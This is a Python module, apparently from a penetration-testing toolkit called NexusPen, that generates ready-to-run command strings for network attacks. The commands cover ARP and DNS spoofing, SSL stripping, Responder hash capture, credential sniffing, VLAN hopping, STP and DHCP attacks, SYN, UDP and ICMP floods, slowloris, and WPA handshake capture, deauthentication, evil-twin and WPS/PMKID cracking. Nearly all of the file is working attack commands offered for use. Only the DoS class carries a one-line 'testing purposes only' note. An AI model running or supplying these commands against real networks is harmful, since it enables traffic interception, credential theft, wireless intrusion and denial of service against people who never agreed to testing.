#!/usr/bin/env python3
"""
NexusPen - Network Attacks Module
==================================
Network attack techniques and MITM.
"""

import subprocess
import os
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.panel import Panel

console = Console()


@dataclass
class AttackResult:
    """Attack result."""
    attack_type: str
    target: str
    success: bool
    output: Optional[str] = None
    captured_data: Optional[str] = None


class ARPAttacks:
    """
    ARP-based attacks.
    """
    
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
    
    def enable_ip_forward(self):
        """Enable IP forwarding."""
        console.print("[cyan]Enabling IP forwarding...[/cyan]")
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    
    def disable_ip_forward(self):
        """Disable IP forwarding."""
        console.print("[cyan]Disabling IP forwarding...[/cyan]")
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
    
    def arp_spoof(self, target: str, gateway: str) -> str:
        """
        Generate ARP spoofing command.
        
        Args:
            target: Target IP to intercept
            gateway: Gateway IP
        """
        cmd = f'''
# Enable IP forwarding first
echo 1 > /proc/sys/net/ipv4/ip_forward

# Terminal 1: Spoof target -> gateway
arpspoof -i {self.interface} -t {target} {gateway}

# Terminal 2: Spoof gateway -> target
arpspoof -i {self.interface} -t {gateway} {target}
'''
        return cmd
    
    def arp_spoof_bettercap(self, target: str, gateway: str) -> str:
        """Generate Bettercap ARP spoof command."""
        cmd = f'''
bettercap -iface {self.interface} -eval "set arp.spoof.targets {target}; arp.spoof on; net.sniff on"
'''
        return cmd
    
    def ettercap_mitm(self, target: str, gateway: str) -> str:
        """Generate Ettercap MITM command."""
        cmd = f'''
ettercap -T -q -i {self.interface} -M arp:remote /{gateway}// /{target}//
'''
        return cmd


class DNSAttacks:
    """
    DNS attack techniques.
    """
    
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
    
    def dns_spoof_ettercap(self, domain: str, redirect_ip: str) -> str:
        """
        Generate DNS spoofing with Ettercap.
        
        Args:
            domain: Domain to spoof
            redirect_ip: IP to redirect to
        """
        # Create etter.dns file
        dns_config = f'{domain} A {redirect_ip}\n*.{domain} A {redirect_ip}'
        
        cmd = f'''
# Create DNS spoof file
echo "{dns_config}" > /tmp/etter.dns

# Run DNS spoof
ettercap -T -q -i {self.interface} -P dns_spoof -M arp // //
'''
        return cmd
    
    def dns_spoof_bettercap(self, domain: str, redirect_ip: str) -> str:
        """DNS spoofing with Bettercap."""
        cmd = f'''
bettercap -iface {self.interface} -eval "set dns.spoof.domains {domain}; set dns.spoof.address {redirect_ip}; dns.spoof on; arp.spoof on"
'''
        return cmd
    
    def dnschef(self, domain: str, redirect_ip: str) -> str:
        """DNS spoofing with dnschef."""
        cmd = f'''
dnschef --fakeip {redirect_ip} --fakedomains {domain} -i 0.0.0.0
'''
        return cmd


class MITMAttacks:
    """
    Man-in-the-Middle attack techniques.
    """
    
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
    
    def ssl_strip(self, listen_port: int = 10000) -> str:
        """
        SSL stripping attack.
        Downgrades HTTPS to HTTP.
        """
        cmd = f'''
# Configure iptables to redirect HTTP
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port {listen_port}

# Run sslstrip
sslstrip -l {listen_port}

# View captured data
tail -f sslstrip.log
'''
        return cmd
    
    def bettercap_https_proxy(self) -> str:
        """Bettercap HTTPS proxy for SSL interception."""
        cmd = f'''
bettercap -iface {self.interface} -eval "set https.proxy.sslstrip true; https.proxy on; arp.spoof on; net.sniff on"
'''
        return cmd
    
    def mitmproxy_intercept(self, port: int = 8080) -> str:
        """mitmproxy for HTTP/HTTPS interception."""
        cmd = f'''
# Start mitmproxy
mitmproxy -p {port}

# Or for web interface
mitmweb -p {port}

# Configure target to use proxy: {port}
'''
        return cmd
    
    def responder(self) -> str:
        """Responder for LLMNR/NBT-NS/MDNS poisoning."""
        cmd = f'''
# Start Responder
responder -I {self.interface} -rdwv

# Captured hashes will be in /usr/share/responder/logs/
'''
        return cmd


class SniffingAttacks:
    """
    Network sniffing techniques.
    """
    
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
    
    def tcpdump_capture(self, filter_exp: str = '', output_file: str = 'capture.pcap') -> str:
        """TCPDump packet capture."""
        cmd = f'tcpdump -i {self.interface} -w {output_file}'
        if filter_exp:
            cmd += f' {filter_exp}'
        return cmd
    
    def tcpdump_credentials(self) -> str:
        """TCPDump for credential capture."""
        cmd = f'''
# HTTP credentials
tcpdump -i {self.interface} -A -s0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' | grep -E 'user|pass|login|User|Pass|Login'

# FTP credentials
tcpdump -i {self.interface} -A 'port ftp or ftp-data' | grep -E 'USER|PASS'

# All cleartext
tcpdump -i {self.interface} -A 'port http or port ftp or port telnet or port smtp'
'''
        return cmd
    
    def wireshark_filter_credentials(self) -> str:
        """Wireshark display filters for credentials."""
        return '''
# HTTP POST data
http.request.method == "POST"

# FTP credentials
ftp.request.command == "USER" or ftp.request.command == "PASS"

# Telnet
telnet

# SMTP authentication
smtp.auth.username or smtp.auth.password

# HTTP Basic Auth
http.authorization

# NTLM hashes
ntlmssp
'''
    
    def dsniff(self) -> str:
        """dsniff for password sniffing."""
        cmd = f'''
dsniff -i {self.interface}
'''
        return cmd
    
    def ettercap_sniff(self) -> str:
        """Ettercap sniffing."""
        cmd = f'''
ettercap -T -q -i {self.interface}
'''
        return cmd
    
    def bettercap_sniff(self) -> str:
        """Bettercap network sniffing."""
        cmd = f'''
bettercap -iface {self.interface} -eval "net.sniff on; set net.sniff.local true"
'''
        return cmd


class VLANAttacks:
    """
    VLAN hopping and attacks.
    """
    
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
    
    def double_tagging(self, native_vlan: int, target_vlan: int) -> str:
        """
        VLAN double tagging attack.
        Allows access to other VLANs.
        """
        cmd = f'''
# Create double-tagged frame using scapy
python3 << 'EOF'
from scapy.all import *

# Create double-tagged frame
pkt = Ether()/Dot1Q(vlan={native_vlan})/Dot1Q(vlan={target_vlan})/IP(dst="TARGET_IP")/ICMP()

# Send packet
sendp(pkt, iface="{self.interface}")
EOF
'''
        return cmd
    
    def dtp_attack(self) -> str:
        """
        DTP (Dynamic Trunking Protocol) attack.
        Force switch to trunk mode.
        """
        cmd = f'''
# Using yersinia for DTP attack
yersinia dtp -attack 1 -interface {self.interface}

# Or with scapy (enable trunking)
python3 << 'EOF'
from scapy.all import *
from scapy.contrib.dtp import *

# Send DTP desired packet
pkt = Ether(dst="01:00:0c:cc:cc:cc")/LLC()/SNAP()/DTP(version=1, tlvlist=[DTPStatus(status="trunk")])
sendp(pkt, iface="{self.interface}", loop=1, inter=30)
EOF
'''
        return cmd
    
    def vlan_hopping_yersinia(self) -> str:
        """VLAN hopping with Yersinia."""
        cmd = f'''
# GUI mode
yersinia -G

# Or interactive mode
yersinia -I

# DTP attack to become trunk
# Then can access all VLANs
'''
        return cmd


class STPAttacks:
    """
    Spanning Tree Protocol attacks.
    """
    
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
    
    def become_root_bridge(self) -> str:
        """
        STP attack to become root bridge.
        All traffic flows through attacker.
        """
        cmd = f'''
# Using yersinia
yersinia stp -attack 4 -interface {self.interface}

# This sends BPDU with lowest priority
# Making attacker the root bridge
'''
        return cmd
    
    def dos_stp(self) -> str:
        """STP DoS attack."""
        cmd = f'''
# Send massive BPDU changes
yersinia stp -attack 2 -interface {self.interface}
'''
        return cmd


class DHCPAttacks:
    """
    DHCP attack techniques.
    """
    
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
    
    def dhcp_starvation(self) -> str:
        """
        DHCP starvation attack.
        Exhaust DHCP pool.
        """
        cmd = f'''
# Using yersinia
yersinia dhcp -attack 1 -interface {self.interface}

# Or using dhcpig
pig.py {self.interface}
'''
        return cmd
    
    def dhcp_rogue_server(self, attacker_ip: str, gateway: str, dns: str) -> str:
        """
        Rogue DHCP server.
        Hand out attacker-controlled settings.
        """
        cmd = f'''
# Using dnsmasq as rogue DHCP
dnsmasq --interface={self.interface} \\
  --dhcp-range=192.168.1.100,192.168.1.200,12h \\
  --dhcp-option=3,{gateway} \\
  --dhcp-option=6,{dns} \\
  --no-daemon

# Or using Metasploit
msfconsole -x "use auxiliary/server/dhcp; set SRVHOST {attacker_ip}; set ROUTER {gateway}; set DNSSERVER {dns}; run"
'''
        return cmd


class NetworkDoS:
    """
    Network Denial of Service techniques.
    For testing purposes only.
    """
    
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
    
    def syn_flood(self, target: str, port: int) -> str:
        """SYN flood attack."""
        cmd = f'''
# Using hping3
hping3 -S --flood -V -p {port} {target}

# Using nping
nping --tcp -p {port} --flags syn --rate 1000 {target}
'''
        return cmd
    
    def udp_flood(self, target: str, port: int) -> str:
        """UDP flood attack."""
        cmd = f'''
hping3 --udp --flood -p {port} {target}
'''
        return cmd
    
    def icmp_flood(self, target: str) -> str:
        """ICMP flood (ping flood)."""
        cmd = f'''
hping3 --icmp --flood {target}
'''
        return cmd
    
    def slowloris(self, target: str, port: int = 80) -> str:
        """Slowloris HTTP DoS."""
        cmd = f'''
slowloris {target} -p {port} -s 500
'''
        return cmd


class WirelessAttacks:
    """
    Wireless network attacks.
    """
    
    def __init__(self, interface: str = 'wlan0'):
        self.interface = interface
    
    def enable_monitor_mode(self) -> str:
        """Enable monitor mode."""
        cmd = f'''
airmon-ng start {self.interface}
# New interface will be {self.interface}mon
'''
        return cmd
    
    def scan_networks(self) -> str:
        """Scan wireless networks."""
        cmd = f'''
airodump-ng {self.interface}mon
'''
        return cmd
    
    def capture_handshake(self, bssid: str, channel: int, output: str = 'capture') -> str:
        """Capture WPA handshake."""
        cmd = f'''
# Target specific AP
airodump-ng -c {channel} --bssid {bssid} -w {output} {self.interface}mon

# In another terminal, deauth to force reconnection
aireplay-ng -0 5 -a {bssid} {self.interface}mon
'''
        return cmd
    
    def crack_wpa(self, capture_file: str, wordlist: str) -> str:
        """Crack WPA with captured handshake."""
        cmd = f'''
aircrack-ng -w {wordlist} {capture_file}

# Or using hashcat (faster with GPU)
# Convert first: hcxpcapngtool -o hash.22000 {capture_file}
# hashcat -m 22000 hash.22000 {wordlist}
'''
        return cmd
    
    def evil_twin(self, essid: str, channel: int) -> str:
        """Evil twin attack."""
        cmd = f'''
# Create fake AP
airbase-ng -e "{essid}" -c {channel} {self.interface}mon

# Or using hostapd-wpe
# Configure hostapd-wpe.conf with ESSID
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
'''
        return cmd
    
    def wps_crack(self, bssid: str) -> str:
        """WPS PIN cracking."""
        cmd = f'''
# Using reaver
reaver -i {self.interface}mon -b {bssid} -vv

# Using bully
bully -b {bssid} -c <channel> {self.interface}mon
'''
        return cmd
    
    def pmkid_attack(self, bssid: str) -> str:
        """PMKID attack (clientless)."""
        cmd = f'''
# Capture PMKID
hcxdumptool -i {self.interface}mon -o pmkid.pcapng --enable_status=1 --filtermode=2 --filterlist_ap={bssid}

# Convert for hashcat
hcxpcapngtool -o pmkid.22000 pmkid.pcapng

# Crack with hashcat
hashcat -m 22000 pmkid.22000 wordlist.txt
'''
        return cmd


def display_all_attacks():
    """Display all available network attacks."""
    console.print("\n[bold cyan]═══════════════════════════════════════════════════════════[/bold cyan]")
    console.print("[bold cyan]              NETWORK ATTACK TECHNIQUES                      [/bold cyan]")
    console.print("[bold cyan]═══════════════════════════════════════════════════════════[/bold cyan]")
    
    attacks = {
        'ARP Attacks': ['ARP Spoofing', 'ARP Cache Poisoning'],
        'DNS Attacks': ['DNS Spoofing', 'DNS Cache Poisoning'],
        'MITM': ['SSL Strip', 'HTTPS Proxy', 'Responder'],
        'Sniffing': ['TCPDump', 'Wireshark', 'dsniff', 'Ettercap'],
        'VLAN': ['Double Tagging', 'DTP Attack', 'VLAN Hopping'],
        'STP': ['Root Bridge Attack', 'STP DoS'],
        'DHCP': ['Starvation', 'Rogue Server'],
        'DoS': ['SYN Flood', 'UDP Flood', 'Slowloris'],
        'Wireless': ['Handshake Capture', 'Evil Twin', 'WPS Crack', 'PMKID'],
    }
    
    from rich.table import Table
    table = Table(title="Available Attack Techniques", show_header=True,
                 header_style="bold red")
    table.add_column("Category", style="yellow", width=15)
    table.add_column("Attacks", style="cyan")
    
    for category, attack_list in attacks.items():
        table.add_row(category, ', '.join(attack_list))
    
    console.print(table)
